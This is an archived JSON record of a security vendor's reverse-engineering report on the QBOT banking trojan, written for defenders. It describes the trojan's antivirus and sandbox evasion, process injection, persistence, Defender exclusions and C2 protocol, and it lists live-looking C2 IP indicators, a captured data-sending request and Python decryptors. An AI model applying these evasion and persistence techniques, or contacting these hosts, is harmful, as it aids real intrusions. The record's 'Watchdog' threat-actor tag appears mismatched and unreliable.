{
    "id": "cb3ad0a7-abc2-46d9-917a-c3f0190cfc57",
    "created_at": "2023-01-12T15:03:53.135779Z",
    "updated_at": "2025-03-27T02:16:59.157049Z",
    "deleted_at": null,
    "sha1_hash": "6897b870e2d996bdd1e7fe503b2a2313d9e47c69",
    "title": "2022-08-24 - QBOT Malware Analysis",
    "authors": "",
    "file_creation_date": "2022-09-01T10:27:11Z",
    "file_modification_date": "2022-09-01T10:27:11Z",
    "file_size": 2877521,
    "plain_text": "# QBOT Malware Analysis\n\n**elastic.co/security-labs/qbot-malware-analysis**\n\nBy\n\nCyril François\n\n24 August 2022\n\n## Key takeaways\n\nElastic Security Labs is releasing a QBOT malware analysis report from a recent\n[campaign](https://www.elastic.co/security-labs/exploring-the-qbot-attack-pattern)\nThis report covers the execution chain from initial infection to communication with its\ncommand and control containing details about in depth features such as its injection\nmechanism and dynamic persistence mechanism.\n[From this research we produced a YARA rule,](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Qbot.yar) [configuration-extractor, and indicators](https://www.elastic.co/security-labs/qbot-configuration-extractor)\nof compromises (IOCs)\n\n## Preamble\n\n\n-----\n\nAs part of our mission to build knowledge about the most common malware families\ntargeting institutions and individuals, the Elastic Malware and Reverse Engineering team\n(MARE) completed the analysis of the core component of the banking trojan\nQBOT/QAKBOT V4 from a previously reported [campaign.](https://www.elastic.co/security-labs/exploring-the-qbot-attack-pattern)\n\nQBOT — also known as QAKBOT — is a modular Trojan active since 2007 used to\ndownload and run binaries on a target machine. This document describes the in-depth\nreverse engineering of the QBOT V4 core components. It covers the execution flow of the\nbinary from launch to communication with its command and control (C2).\n\nQBOT is a multistage, multiprocess binary that has capabilities for evading detection,\nescalating privileges, configuring persistence, and communicating with C2 through a set of\nIP addresses. The C2 can update QBOT, upload new IP addresses, upload and run fileless\nbinaries, and execute shell commands.\n\nAs a result of this analysis, MARE has produced a new yara rule based on the core\ncomponent of QBOT as well as a static configuration extractor able to extract and decrypt\nits strings, its configuration, and its C2 IP address list.\n\nAdditional QBOT resources\n\nFor information on the QBOT configuration extractor and malware analysis, check out our\nblog posts detailing this:\n\n## Execution flow\n\nThis section describes the QBOT execution flow in the following three stages:\n\nFirst Stage: Initialization\nSecond Stage: Installation\nThird Stage: Communication\n\n### Stage 1\n\n\n-----\n\nFirst stage execution flow\nThe sample is executed with the regsvr32.exe binary, which in turn will call QBOT’s\n**DllRegisterServer export:**\n\nregsvr32.exe loading QBOT and calling its DllRegisterServer export.\nAfter execution, QBOT checks if it’s running under the Windows Defender sandbox by\nchecking the existence of a specific subdirectory titled: C:\\\\INTERNAL\\\\__empty, if this\nfolder exists, the malware terminates itself:\n\n\n-----\n\nQBOT checking if it is running and Windows Defender sandbox.\nThe malware will then enumerate running processes to detect any antivirus (AV) products\non the machine. The image below contains a list of AV vendors QBOT reacts to:\n\nEnum of vendors QBOT can detect.\n\nAV detection will not prevent QBOT from running. However, it will change its behavior in\nlater stages. In order to generate a seed for its pseudorandom number generator (PRNG),\nQBOT generates a fingerprint of the computer by using the following expression:\n```\nfingerprint = CRC32(computerName + CVolumeSerialNumber + AccountName)\n\n```\nIf the “C:” volume doesn’t exist the expression below is used instead:\n```\nfingerprint = CRC32(computerName + AccountName)\n\n```\nFinally, QBOT will choose a set of targets to inject into depending on the AVs previously\ndetected and the machine architecture:\n\n**AV detected & architecture** **Targets**\n\n\nBitDefender | Kaspersky |\nSophos | TrendMicro | & x86\n\nBitDefender | Kaspersky |\nSophos | TrendMicro & x64\n\n\n**%SystemRoot%\\\\SysWOW64\\\\mobsync.exe**\n**%SystemRoot%\\\\SysWOW64\\\\explorer.exe**\n\n**%SystemRoot%\\\\System32\\\\mobsync.exe**\n\n**%SystemRoot%\\\\explorer.exe**\n\n**%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe**\n\n\n-----\n\nAvast | AVG | Windows\nDefender & x86\n\nAvast | AVG | Windows\nDefender & x64\n\n\n**%SystemRoot%\\\\SysWOW64\\\\OneDriveSetup.exe**\n\n**%SystemRoot%\\\\SysWOW64\\\\msra.exe**\n\n**%ProgramFiles(x86)%\\\\Internet**\n**Explorer\\\\iexplore.exe**\n\n**%SystemRoot%\\\\System32\\\\OneDriveSetup.exe**\n\n**%SystemRoot%\\\\System32\\\\msra.exe**\n\n\nx86 **'%SystemRoot%\\\\explorer.exe**\n\n**%SystemRoot%\\\\System32\\\\msra.exe**\n\n**%SystemRoot%\\\\System32\\\\OneDriveSetup.exe**\n\nx64 **%SystemRoot%\\\\SysWOW64\\\\explorer.exe**\n\n**%SystemRoot%\\\\SysWOW64\\\\msra.exe**\n\n**%SystemRoot%\\\\System32\\\\OneDriveSetup.exe**\n\nQBOT will try to inject itself iteratively, using its second stage as an entry point, into one of\nits targets– choosing the next target process if the injection fails. Below is an example of\nQBOT injecting into explorer.exe.\n\n\n-----\n\nQBOT injecting itself into explorer.exe\n\n### Stage 2\n\n\n-----\n\nSecond stage execution flow\nQBOT begins its second stage by saving the content of its binary in memory and then\ncorrupting the file on disk:\n\nQBOT corrupting its binary file\n\n\n-----\n\nThe malware then loads its configuration from one of its resource sections:\n\nQBOT loading its configuration from resource\nQBOT also has the capability to load its configuration from a .cfg file if available in the\nprocess root directory:\n\nQBOT trying to load its configuration from a file\nAfter loading its configuration, QBOT proceeds to install itself on the machine– initially by\nwriting its internal configuration to the registry:\n\nQBOT writing its configuration to the registry\nShortly after, QBOT creates a persistence subdirectory with a randomly-generated name\nunder the %APPDATA%\\Microsoft directory. This folder is used to drop the in-memory\nQBOT binary for persistence across reboot:\n\nQBOT creating its persistence folder\nAt this point, the folder will be empty because the malware will only drop the binary if a\nshutdown/reboot event is detected. This “contingency” binary will be deleted after reboot.\n\n\n-----\n\nQBOT will attempt the same install process for all users and try to either execute the\nmalware within the user session if it exists, or create a value under the\n**CurrentVersion\\Run registry key for the targeted user to launch the malware at the next**\nlogin. Our analysis didn’t manage to reproduce this behavior on an updated Windows 10\nmachine. The only artifact observed is the randomly generated persistence folder created\nunder the user %APPDATA%\\Microsoft directory:\n\nPersistence folder is empty when QBOT is running\nQBOT finishes its second stage by restoring the content of its corrupted binary and\nregistering a task via Schtask to launch a QBOT service under the NT\n**AUTHORITY\\SYSTEM account.**\n\nThe first stage has a special execution path where it registers a service handler if the\nprocess is running under the SYSTEM account. The QBOT service then executes stages 2\nand 3 as normal, corrupting the binary yet again and executing commands on behalf of\nother QBOT processes via messages received through a randomly generated named pipe:\n\nQBOT running as SYSTEM service\n\n### Stage 3\n\n\n-----\n\nThird stage execution flow\nQBOT begins its third stage by registering a window and console event handler to monitor\nsuspend/resume and shutdown/reboot events. Monitoring these events enables the\nmalware to install persistence dynamically by dropping a copy of the QBOT binary in the\npersistence folder and creating a value under the CurrentVersion\\Run registry key:\n\nQBOT install persistence when suspend/resume or shutdown/reboot event occurs\nAt reboot, QBOT will take care of deleting any persistence artifacts.\n\nThe malware will proceed to creating a watchdog thread to monitor running processes\nagainst a hardcoded list of binaries every second. If any process matches, a registry value\nis set that will then change QBOT behavior to use randomly generated IP addresses\ninstead of the real one, thus never reaching its command and control:\n\n\n-----\n\nfrida-winjector-helper-32.exe\n\nfrida-winjector-helper-64.exe\n\nTcpdump.exe\n\nwindump.exe\n\nethereal.exe\n\nwireshark.exe\n\nettercap.exe\n\nrtsniff.exe\n\npacketcapture.exe\n\ncapturenet.exe\n\nqak_proxy\n\n\ndumpcap.exe\n\nCFF Explorer.exe\n\nnot_rundll32.exe\n\nProcessHacker.exe\n\ntcpview.exe\n\nfilemon.exe\n\nprocmon.exe\n\nidaq64.exe\n\nPETools.exe\n\nImportREC.exe\n\nLordPE.exe\n\n\nSysInspector.exe\n\nproc_analyzer.exe\n\nsysAnalyzer.exe\n\nsniff_hit.exe\n\njoeboxcontrol.exe\n\njoeboxserver.exe\n\nResourceHacker.exe\n\nx64dbg.exe\n\nFiddler.exe\n\nsniff_hit.exe\n\nsysAnalyzer.exe\n\n\nQBOT will then load its domains from one of its .rsrc files and from the registry as every\ndomain update received from its C2 will be part of its configuration written to the registry.\nSee Extracted Network Infrastructure in Appendix A.\n\nFinally, the malware starts communicating with C2 via HTTP and TLS. The underlying\nprotocol uses a JSON object encapsulated within an enciphered message which is then\nbase64-encoded:\n\nQBOT message format\n\nBelow an example of a HTTP POST request sent by QBOT to its C2:\n\n\n-----\n\n```\nAccept: application/x shockwave flash, image/gif, image/jpeg, image/pjpeg, /\n\nContent-Type: application/x-www-form-urlencoded\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: 181.118.183.98\n\nContent-Length: 77\n\nCache-Control: no-cache\n\nqxlbjrbj=NnySaFAKLt+YgjH3UET8U6AUwT9Lg51z6zC+ufeAjt4amZAXkIyDup74MImUA4do4Q==\n\n```\nThrough this communication channel, QBOT receives commands from C2 — see Appendix\nB (Command Handlers). Aside from management commands (update, configuration knobs),\nour sample only handles binary execution-related commands, but we know that the\nmalware is modular and can be built with additional features like a VNC server, a reverse\nshell server, proxy support (to be part of the domains list), and numerous other capabilities\nare feasible.\n\n## Features\n\n### Mersenne Twister Random Number Generator\n\n[QBOT uses an implementation of Mersenne Twister Random Number Generator (MTRNG)](https://www.sciencedirect.com/topics/computer-science/mersenne-twister)\nto generate random values:\n\nQBOT's Mersenne Twister Random Number Generator implementation\nThe MTRNG engine is then used by various functions to generate different types of data,\nfor example for generating registry key values and persistence folders. As QBOT needs to\nreproduce values, it will almost always use the computer fingerprint and a “salt” specific to\nthe value it wants to generate:\n\nQBOT generating random event name with fixed seed and salt\n\n### String obfuscation\n\n\n-----\n\nAll QBOT strings are XOR-encrypted and concatenated in a single blob we call a string\nbank”. To get a specific string the malware needs a string identifier (identifier being an offset\nin the string bank), a decryption key, and the targeted string bank.\n\nGetStringAux function prototype.\n\nAs this sample has two string banks, it has four GetString' functions currying the string\nbank and the decryption key parameters: One C string function and one wide string function\nfor each string bank. Wide string functions use the same string banks, but convert the data\nto utf-16.\n\nQBOT\n\ncalling GetString function\n\nGetString\n\nfunction currying GetStringAux with string bank and key parameters\nSee Appendix C (String Deciphering Implementation).\n\n### Import obfuscation\n\nQBOT resolves its imports using a hash table:\n\nQBOT calling GetApi function\n\nGetApi function prototype\nThe malware resolves the library name through its GetString function and then resolves the\nhash table with a classic library’s exports via manual parsing, comparing each export to the\nexpected hash. In this sample, the hashing comparison algorithm use this formula:\n```\nCRC32(exportName) XOR 0x218fe95b == hash\n\n### Resource obfuscation\n\n```\nThe malware is embedded with different resources, the common ones are the configuration\nand the domains list. Resources are encrypted the same way: The decryption key may be\neither embedded within the data blob or provided. Once the resource is decrypted, an\n\n\n-----\n\nembedded hash is used to check data validity.\n\nQBOT decrypting its resource with embedded or provided key\nSee Appendix D (Resource Deciphering Implementation).\n\n### Cyrillic keyboard language detection\n\nAt different stages, QBOT will check if the computer uses a Cyrillic language keyboard. If it\ndoes, it prevents further execution.\n\nSet of languages QBOT is\n\nlooking to stop its execution\n\n### AVG/AVAST special behavior\n\nAVG and Avast share the same antivirus engine. Thus if QBOT detects one of those\nantivirus running, it will also check at the installation stage if one of their DLLs is loaded\nwithin the malware memory space. If so, QBOT will skip the installation phase.\n\n\n-----\n\nQBOT checking if AVG/AVAST has hooked its process\n\n### Windows Defender special behavior\n\nIf QBOT is running under SYSTEM account, it will add its persistence folder to the Windows\nDefender exclusion path in the registry. It will also do this for the legacy Microsoft Security\nEssential (MSE) exclusion path if detected.\n\nQBOT\n\nadding its persistence folder to Windows Defender and MSE exclusion paths\n\n### Exception list process watchdog\n\nEach second, QBOT parses running processes looking for one matching the hardcoded\nexception list. If any is found, a “fuse” value is set in the registry and the watchdog stops. If\nthis fuse value is set, QBOT will not stop execution– but at the third stage, the malware will\nuse randomly generated IP and won't be able to contact C2.\n\n\n-----\n\nWatchdog thread setting fuse if any Exceptionlisted process is detected\n\nQBOT using randomly generated IP address if fuse is set\n\n### QBOT process injection\n\n**Second stage injection**\n\nTo inject its second stage into one of a hardcoded target, QBOT uses a classic\n**CreateProcess, WriteProcessMemory, ResumeProcess DLL injection technique. The**\nmalware will create a process, allocate and write the QBOT binary within the process\nmemory, write a copy of its engine, and patch the entry point to jump to a special function.\nThis function performs a light initialization of QBOT and its engine within the new process\nenvironment, alerts the main process of its success, and then execute the second stage.\n\nQBOT second stage injection\n\n\n-----\n\nQBOT injection entry point\n\n**Injecting library from command and control**\n\nQBOT uses the aforementioned method to inject libraries received from C2. The difference\nis that as well as mapping itself, the malware will also map the received binary and use a\nlibrary loader as entry point.\n\nQBOT DLL loader injection\n\nQBOT Dll loader entrypoint\n\n\n-----\n\n### Multi-user installation\n\nPart of the QBOT installation process is installing itself within others users’ accounts. To do\nso, the malware enumerates each user with an account on the machine (local and domain),\nthen dumps its configuration under the user’s Software\\Microsoft registry key, creates a\npersistence folder under the users’ %APPDATA%\\Microsoft folder, and finally tries to\neither launch QBOT under the user session if the session exist, or else creates a run key to\nlaunch the malware when the user will log in.\n\nQBOT installation & run for one user\n\n### Dynamic persistence\n\nQBOT registers a window handler to monitor suspend/resume events. When they occur, the\nmalware will install/uninstall persistence.\n\nQBOT window handler registration\n\n\n-----\n\nQBOT window handler catching suspend/resume event\nQBOT registers a console event to handle shutdown/reboot events as well.\n\nQBOT registering console handler\n\nQBOT console handler catching shutdown/reboot event\n\n### Command and control public key pinning\n\nQBOT has a mechanism to verify the signature of every message received from its\ncommand and control. The verification mechanism is based on a public key embedded in\nthe sample. This public key could be used to identify the campaign the sample belongs to,\n\n\n-----\n\nbut this mechanism may not always be present.\n\nQBOT command and control message processing\n\nMessage signature verification with hardcoded command and control public key\nThe public key comes from a hardcoded XOR-encrypted data blob.\n\nHardcoded command and\n\ncontrol public key being XOR-decrypted\n\n### Computer information gathering\n\nPart of QBOT communication with its command and control is sending information about\nthe computer. Information are gathered through a set Windows API calls, shell commands\nand Windows Management Instrumentation (WMI) commands:\n\n\n-----\n\nComputer information gathering 1/2\n\nComputer information gathering 2/2\nOne especially interesting procedure listed installed antivirus via WMI:\n\nQBOT listing installed antivirus via a WMI command\n\n\n-----\n\n### Update mechanism\n\nQBOT can receive updates from its command and control. The new binary will be written to\ndisk, executed through a command line, and the main process will terminate.\n\nQBOT writing to disk and running the updated binary\n\nQBOT stopping execution if update is running\n\n### Process injection manager\n\nQBOT has a system to keep track of processes injected with binaries received from its\ncommand and control in order to manage them as the malware receives subsequent\ncommands. It also has a way to serialize and save those binaries on disk in case it has to\nstop execution and recover execution when restarted.\n\nTo do this bookkeeping, QBOT maintains two global structures — a list of all binaries\nreceived from its command and control, and a list of running injected processes:\n\nQBOT’s list of DLL to inject received from its command and control.\n\nQBOT’s list of\n\nrunning injected processes\n\n\n-----\n\n## Conclusion\n\nThe QBOT malware family is highly active and still part of the threat landscape in 2022 due\nto its features and its powerful modular system. While initially characterized as an\ninformation stealer in 2007, this family has been leveraged as a delivery mechanism for\nadditional malware and post-compromise activity.\n\nElastic Security provides out-of-the-box prevention capabilities against this threat. Existing\nElastic Security users can access these capabilities within the product. If you’re new to\nElastic Security, take a look at our [Quick Start guides (bite-sized training videos to get you](https://www.elastic.co/training/free#quick-starts)\n[started quickly) or our free fundamentals training courses. You can always get started with a](https://www.elastic.co/training/free#fundamentals)\n[free 14-day trial of Elastic Cloud.](https://cloud.elastic.co/registration?elektra=whats-new-elastic-security-7-16-blog)\n\n## MITRE ATT&CK Tactics and Techniques\n\nMITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and\ntechniques based on real-world observations. The ATT&CK knowledge base is used as a\nfoundation for the development of specific threat models and methodologies in the private\nsector, in government, and in the cybersecurity product and service community.\n\n### Tactics\n\nTactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal:\nthe reason for performing an action.\n\nTactic: [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)\nTactic: [Defense Evasion](https://attack.mitre.org/tactics/TA0005)\nTactic: [Discovery](https://attack.mitre.org/tactics/TA0007)\nTactic: [Command and Control](https://attack.mitre.org/tactics/TA0011)\n\n### Techniques / Sub Techniques\n\nTechniques and Sub techniques represent how an adversary achieves a tactical goal by\nperforming an action.\n\n[Technique: Process Injection (T1055)](https://attack.mitre.org/techniques/T1055)\n[Technique: Modify Registry (T1112)](https://attack.mitre.org/techniques/T1112)\n[Technique: Obfuscated Files or Information (T1027)](https://attack.mitre.org/techniques/T1027)\n[Technique: Obfuscated Files or Information: Indicator Removal from Tools](https://attack.mitre.org/techniques/T1027/005)\n(T1027.005)\n[Technique: System Binary Proxy Execution: Regsvr32 (T1218.010)](https://attack.mitre.org/techniques/T1218/010)\n\n[Technique: Application Window Discovery (T1010)](https://attack.mitre.org/techniques/T1010)\n[Technique: File and Directory Discovery (T1083)](https://attack.mitre.org/techniques/T1083)\n[Technique: System Information Discovery (T1082)](https://attack.mitre.org/techniques/T1082)\n\n\n-----\n\n[Technique: System Location Discovery (T1614)](https://attack.mitre.org/techniques/T1614)\n[Technique: Software Discovery: Security Software Discovery (T1518.001)](https://attack.mitre.org/techniques/T1518/001)\n[Technique: System Owner/User Discovery (T1033)](https://attack.mitre.org/techniques/T1033)\n[Technique: Application Layer Protocol: Web Protocols (T1071.001)](https://attack.mitre.org/techniques/T1071/001)\n\n## Observations\n\nWhile not specific enough to be considered indicators of compromise, the following\ninformation was observed during analysis that can help when investigating suspicious\nevents.\n\n### File System\n\n**Persistence folder**\n```\n%APPDATA%\\Microsoft\\[Random Folder]\n\n```\n**Example:**\n```\nC:\\Users\\Arx\\AppData\\Roaming\\Microsoft\\Vuhys\n\n### Registry\n\n```\n**Scan Exclusion**\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\[Persistence Folder]\n\n```\n**Example:**\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\nDefender\\Exclusions\\Paths\\C:\\Users\\Arx\\AppData\\Roaming\\Microsoft\\Blqgeaf\n\n### Configuration\n\n```\n**Configuration**\n```\nHKU\\[User SID]\\Software\\Microsoft\\[Random Key]\\[Random Value 0]\n\n```\n**Example:**\n```\nHKU\\S-1-5-21-2844492762-1358964462-32961910671000\\Software\\Microsoft\\Silhmfua\\28e2a7e8\n\n## Appendices\n\n### Appendix A (extracted network infrastructure)\n\n```\n\n-----\n\n1.161.71.109:443\n\n1.161.71.109:995\n\n100.1.108.246:443\n\n101.50.103.193:995\n\n102.182.232.3:995\n\n103.107.113.120:443\n\n103.139.243.207:990\n\n103.246.242.202:443\n\n103.87.95.133:2222\n\n103.88.226.30:443\n\n105.226.83.196:995\n\n108.60.213.141:443\n\n109.12.111.14:443\n\n109.228.220.196:443\n\n113.11.89.165:995\n\n117.248.109.38:21\n\n120.150.218.241:995\n\n120.61.2.95:443\n\n121.74.167.191:995\n\n125.168.47.127:2222\n\n138.204.24.70:443\n\n140.82.49.12:443\n\n140.82.63.183:443\n\n140.82.63.183:995\n\n143.0.34.185:443\n\n144.202.2.175:443\n\n144.202.2.175:995\n\n144.202.3.39:443\n\n\n186.105.121.166:443\n\n187.102.135.142:2222\n\n187.207.48.194:61202\n\n187.250.114.15:443\n\n187.251.132.144:22\n\n190.252.242.69:443\n\n190.73.3.148:2222\n\n191.17.223.93:32101\n\n191.34.199.129:443\n\n191.99.191.28:443\n\n196.233.79.3:80\n\n197.167.62.14:993\n\n197.205.127.234:443\n\n197.89.108.252:443\n\n2.50.137.197:443\n\n201.145.189.252:443\n\n201.211.64.196:2222\n\n202.134.152.2:2222\n\n203.122.46.130:443\n\n208.107.221.224:443\n\n209.197.176.40:995\n\n217.128.122.65:2222\n\n217.164.210.192:443\n\n217.165.147.83:993\n\n24.178.196.158:2222\n\n24.43.99.75:443\n\n31.35.28.29:443\n\n31.48.166.122:2078\n\n\n47.156.191.217:443\n\n47.180.172.159:443\n\n47.180.172.159:50010\n\n47.23.89.62:993\n\n47.23.89.62:995\n\n5.32.41.45:443\n\n5.95.58.211:2087\n\n66.98.42.102:443\n\n67.209.195.198:443\n\n68.204.7.158:443\n\n70.46.220.114:443\n\n70.51.138.126:2222\n\n71.13.93.154:2222\n\n71.74.12.34:443\n\n72.12.115.90:22\n\n72.252.201.34:995\n\n72.76.94.99:443\n\n73.151.236.31:443\n\n73.67.152.98:2222\n\n74.15.2.252:2222\n\n75.113.214.234:2222\n\n75.99.168.194:443\n\n75.99.168.194:61201\n\n76.169.147.192:32103\n\n76.25.142.196:443\n\n76.69.155.202:2222\n\n76.70.9.169:2222\n\n78.87.206.213:995\n\n\n-----\n\n144.202.3.39:995\n\n148.64.96.100:443\n\n149.28.238.199:443\n\n149.28.238.199:995\n\n172.114.160.81:995\n\n172.115.177.204:2222\n\n173.174.216.62:443\n\n173.21.10.71:2222\n\n174.69.215.101:443\n\n175.145.235.37:443\n\n176.205.119.81:2078\n\n176.67.56.94:443\n\n176.88.238.122:995\n\n179.158.105.44:443\n\n180.129.102.214:995\n\n180.183.128.80:2222\n\n181.118.183.98:443\n\n181.208.248.227:443\n\n181.62.0.59:443\n\n182.191.92.203:995\n\n182.253.189.74:2222\n\n185.69.144.209:443\n\n\n32.221.224.140:995\n\n37.186.54.254:995\n\n37.34.253.233:443\n\n38.70.253.226:2222\n\n39.41.158.185:995\n\n39.44.144.159:995\n\n39.52.75.201:995\n\n39.57.76.82:995\n\n40.134.246.185:995\n\n41.228.22.180:443\n\n41.230.62.211:993\n\n41.38.167.179:995\n\n41.84.237.10:995\n\n42.235.146.7:2222\n\n45.241.232.25:995\n\n45.46.53.140:2222\n\n45.63.1.12:443\n\n45.63.1.12:995\n\n45.76.167.26:443\n\n45.76.167.26:995\n\n45.9.20.200:443\n\n46.107.48.202:443\n\n\n80.11.74.81:2222\n\n81.215.196.174:443\n\n82.152.39.39:443\n\n83.110.75.97:2222\n\n84.241.8.23:32103\n\n85.246.82.244:443\n\n86.97.11.43:443\n\n86.98.208.214:2222\n\n86.98.33.141:443\n\n86.98.33.141:995\n\n88.228.250.126:443\n\n89.211.181.64:2222\n\n90.120.65.153:2078\n\n91.177.173.10:995\n\n92.132.172.197:2222\n\n93.48.80.198:995\n\n94.36.195.250:2222\n\n94.59.138.62:1194\n\n94.59.138.62:2222\n\n96.21.251.127:2222\n\n96.29.208.97:443\n\n96.37.113.36:993\n\n\n### Appendix B (command handlers)\n\n**Id** **Handler**\n\n0x1 MARE::rpc::handler::CommunicateWithC2\n\n\n-----\n\n**Id** **Handler**\n\n0x6 MARE::rpc::handler::EnableGlobalRegistryConfigurationValuek0x14\n\n0x7 MARE::rpc::handler::DisableGlobalRegistryConfigurationValuek0x14\n\n0xa MARE::rpc::handler::KillProcess\n\n0xc MARE::rpc::handler::SetBunchOfGlobalRegistryConfigurationValuesAndTriggerEvent1\n\n0xd MARE::rpc::handler::SetBunchOfGlobalRegistryConfigurationValuesAndTriggerEvent0\n\n0xe MARE::rpc::handler::DoEvasionMove\n\n0x12 MARE::rpc::handler::NotImplemented\n\n0x13 MARE::rpc::handler::UploadAndRunUpdatedQBOT0\n\n0x14 MARE::rpc::handler::Unk0\n\n0x15 MARE::rpc::handler::Unk1\n\n0x19 MARE::rpc::handler::UploadAndExecuteBinary\n\n0x1A MARE::rpc::handler::UploadAndInjectDll0\n\n0x1B MARE::rpc::handler::DoInjectionFromDllToInjectByStr\n\n0x1C MARE::rpc::handler::KillInjectedProcessAndDisableDllToInject\n\n0x1D MARE::rpc::handler::Unk3\n\n0x1E MARE::rpc::handler::KillInjectedProcessAndDoInjectionAgainByStr\n\n0x1F MARE::rpc::handler::FastInjectdll\n\n\n-----\n\n**Id** **Handler**\n\n0x21 MARE::rpc::handler::ExecuteShellCmd\n\n0x23 MARE::rpc::handler::UploadAndInjectDll1\n\n0x24 MARE::rpc::handler::UploadAndRunUpdatedQBOT1\n\n0x25 MARE::rpc::handler::SetValueToGlobalRegistryConfiguration\n\n0x26 MARE::rpc::handler::DeleteValueFromGlobalRegistryConfiguration\n\n0x27 MARE::rpc::handler::ExecutePowershellCmd\n\n0x28 MARE::rpc::handler::UploadAndRunDllWithRegsvr32\n\n0x29 MARE::rpc::handler::UploadAndRunDllWithRundll32\n\n### Appendix C (string deciphering implementation)\n```\ndef decipher_strings(data: bytes, key: bytes) -> bytes:\n\n  result = dict()\n\n  current_index = 0\n\n  current_string = list()\n\n  for i in range(len(data)):\n\n    current_string.append(data[i] ^ key[i % len(key)])\n\n    if data[i] == key[i % len(key)]:\n\n       result[current_index] = bytes(current_string)\n\n       current_string = list()\n\n       current_index = i + 1\n\n  return resultRead more\n\n Appendix D (resource deciphering implementation)\n\n```\n\n-----\n\n```\nfrom Crypto.Cipher import ARC4\n\nfrom Crypto.Hash import SHA1\n\ndef decipher_data(data: bytes, key: bytes) -> tuple[bytes, bytes]:\n\n  data = ARC4.ARC4Cipher(SHA1.SHA1Hash(key).digest()).decrypt(data)\n\n  return data[20:], data[:20]\n\n\ndef verify_hash(data: bytes, expected_hash: bytes) -> bool:\n\n  return SHA1.SHA1Hash(data).digest() == expected_hash\n\n\ndef decipher_rsrc(rsrc: bytes, key: bytes) -> bytes:\n\n  deciphered_rsrc, expected_hash = decipher_data(rsrc[20:], rsrc[:20])\n\n  if not verify_hash(deciphered_rsrc, expected_hash):\n\n    deciphered_rsrc, expected_hash = decipher_data(rsrc, key)\n\n    if not verify_hash(deciphered_rsrc, expected_hash):\n\n       raise RuntimeError('Failed to decipher rsrc: Mismatching hashes.')\n  return deciphered_rsrcRead more\n\n## Related content\n\n```\nSee all top stories\n\n### LUNA Ransomware Attack Pattern Analysis\n\n\n-----\n\nIn this research publication, we ll explore the LUNA attack pattern — a cross-platform\nransomware variant.\n\n### The Elastic Container Project for Security Research\n\nThe Elastic Container Project provides a single shell script that will allow you to stand up and\nmanage an entire Elastic Stack using Docker. This open source project enables rapid\ndeployment for testing use cases.\n\n\n-----\n\n### Getting the Most Out of Transformers in Elastic\n\nIn this blog, we will briefly talk about how we fine-tuned a transformer model meant for a\nmasked language modeling (MLM) task, to make it suitable for a classification task.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-24 - QBOT Malware Analysis.pdf"
    ],
    "report_names": [
        "2022-08-24 - QBOT Malware Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535833,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1662028031,
    "ts_modification_date": 1662028031,
    "files": {
        "pdf": "https://archive.orkl.eu/6897b870e2d996bdd1e7fe503b2a2313d9e47c69.pdf",
        "text": "https://archive.orkl.eu/6897b870e2d996bdd1e7fe503b2a2313d9e47c69.txt",
        "img": "https://archive.orkl.eu/6897b870e2d996bdd1e7fe503b2a2313d9e47c69.jpg"
    }
}